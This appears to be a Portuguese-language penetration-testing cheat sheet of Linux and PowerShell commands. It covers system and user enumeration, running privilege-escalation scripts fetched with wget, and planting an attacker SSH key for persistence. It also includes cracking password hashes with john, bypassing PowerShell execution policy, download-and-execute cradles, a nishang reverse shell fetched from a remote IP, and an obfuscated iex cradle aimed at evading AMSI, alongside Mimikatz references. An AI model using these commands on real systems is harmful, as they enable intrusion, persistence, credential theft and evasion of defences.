
Sistema Operacional e Kernel 

```bash
cat /etc/issue
cat /etc/lsb-release
cat /etc/os-release

uname -a
uname -mrs
cat /proc/version
``` 

Variáveis de ambiente e configurações locais

```bash
set
env
hostname
cat /etc/hosts
cat /etc/resolv.conf
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -lg {} \; >> suid.txt 2>/dev/null
``` 

informações de usuários e grupos

```bash
whoami
w
id
cat /etc/passwd
cat /etc/group
ls -a /home
id <usuário>
``` 

pontos de montagem, partições, serviços, agendamentos e processos

```bash
cat /etc/fstab
mount

cat /etc/crontab
ls /etc/cron.daily
ls /etc/cron.weeakly
ls /etc/cron.monthly

ps aux 
ps aux | grep "root"
``` 

Configurações de rede 

```bash
ifconfig
ipconfig 
arp -a 
arp -na
ip addr ip a
route -n
ip route
netstat -tupna
ss -ltnau 
ss -lntup
``` 

LinEnum.sh

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
cmod +x LinEnum.sh
./LinEnum.sh > out_linenum.txt
``` 
linuxprivchecker.py 

```bash
wget https://raw.githubusercontent.com/swarley7/linuxprivchecker/master/linuxprivchecker.py
python3 linuxprivchecker.py > out_linuxprivchecker.txt

``` 
LES - Linux Exploit Suggester

```bash
wget https://github.com/The-Z-Labs/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh 
chmod +x linux-exploit-suggester.sh 
linux-exploit-suggester.sh > out_linux-exploit-suggester.txt 
``` 

Casualidades 

```bash
grep -r password *

cat /home/user/.ssh/authorized_keys
# maquina atacante
ssh-keygen
cat user.key.pub
# copia chave da maquina atacante para a maquina alvo
nano /home/user/.ssh/authorized_keys
# maquina atacante conectando
ssh -l user.key.pub usuario@127.0.0.1

cat /etc/ssh/sshd_config | grep PermitRoot

``` 

sempre esqueço

```bash
gcc exemplo.c -o exemplo
sudo python3 -m http.server 80
john --format=sha512crypt --wordlist=basket.txt linux-sysdev-hash
``` 

Criação e permissão de usuário 

```bash
adduser system
usermod -a -G sudo system
deluser
``` 
Gerar uma nova wordlist baseada na rockyou.txt, buscando pela palavra “basketball”

```bash
grep -i basketball /usr/share/wordlists/rockyou.txt > basket.txt
``` 

```ps1
Get-Host
host
$PSVersionTable

Get-Command *process*
Get-Command -Name *Firewall*

Get-Help *
Get-Help *process*
Get-Help -Full Get-Process

Get-Proces
Get-Process | Get-Member
Get-Process | Select-Object ProcessName

alias
alias -Definition Get-ChildItem

1..5 | ForEach-Object {$_ * 2} # o > do powershell 
Get-Service | Where-Object Status -eq running
Get-Service | ? {$_.status -eq "running"}

Get-ExecutionPolicy

Set-ExecutionPolicy RemoteSigned
Set-ExecutionPolicy Unrestricted
Set-ExecutionPolicy Bypass

powershell.exe -ExecutionPolicy ByPass .\exemplo.ps1
powershell -exec bypass .\teste.ps1
powershell -exec bypass -noprofile .\teste.ps1
powershell -c "<comandos>"
powershell -nop -exe bypass

(New-Object Net.WebClient).DownloadFile("http://<endereço_IP_URL>/arquivo", "C:\temp\file")
wget "http://<endereço_IP_URL/arquivo" -OutFile "C:\temp\file"

Invoke-Expression .\exemplo.ps1
cat .\exemplo.ps1 | iex

Get-Process | Format-List -Property Name,Path

powershell -nop -exec bypass iex (New-Object Net.WebClient).DownloadFile("http://<endereço_IP_URL>/arquivo", "C:\temp\file")
wget "http://<endereço_IP_URL/arquivo" -OutFile "C:\temp\file"

``` 

```ps1
git clone https://github.com/samratashok/nishang.git
powershell -nop -exe bypass “Import-Module c:\temp\shell.ps1”

powershell -nop -exe bypass -c "Import-Module c:\temp\shell.ps1; Get-Help Invoke-PowerShellTcp"

powershell -nop -exe bypass -c "Import-Module c:\temp\shell.ps1; Invoke-PowerShellTcp -Reverse -IPAddress 127.0.0.1 -Port 8060"

powershell -nop -exe bypass -c "iex (New-Object Net.WebClient).DownloadString('http://172.16.192.200/Invoke-PowerShellTcp.ps1');
Invoke-PowerShellTcp -Reverse -IPAddress 127.0.0.1 -Port 8060"

powershell -nop -exe bypass iex (New-Object Net.WebClient).DownloadString('http://127.0.0.1/imagem.jpg')

'amsicontext'
'Invoke-Mimikatz'

d %SystemRoot%\System32 && echo Iex("Iex`(nEW-OBjE`Ct
NEt.w`eb`cl`I`EnT).do`wN`LOAdsTRin`g`('http://127.0.0.1/fig1.jpg`'`)"); |
WindowsPowerShell\v1.0\powershell.exe -nop -win 1 -
``` 

Pacotes e programas instalados

```bash
dpkg --get-selections
apt list --installed
dnf list installed
pacman -Q
flatpak list
snap list
``` 

```bash

``` 

